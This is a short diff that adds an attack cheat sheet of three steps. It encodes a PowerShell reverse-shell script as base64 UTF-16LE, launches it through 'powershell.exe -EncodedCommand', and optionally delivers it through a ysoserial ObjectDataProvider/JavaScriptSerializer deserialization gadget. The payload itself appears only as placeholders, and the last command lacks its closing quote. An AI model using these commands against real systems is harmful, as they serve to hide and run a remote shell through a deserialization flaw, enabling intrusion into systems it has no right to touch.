@@ -1,0 +1,8 @@
+*NIX:
+$ iconv -f ASCII -t UTF-16LE ps_revshell.txt | base64 | tr -d "\n"
+
+PS:
+powershell.exe -EncodedCommand {B64_PAYLOAD}
+
+OPTIONAL YSOSERIAL USAGE:
+ysoserial.exe -g ObjectDataProvider -f JavaScriptSerializer -c 'powershell.exe -EncodedCommand {COMMAND_B64}
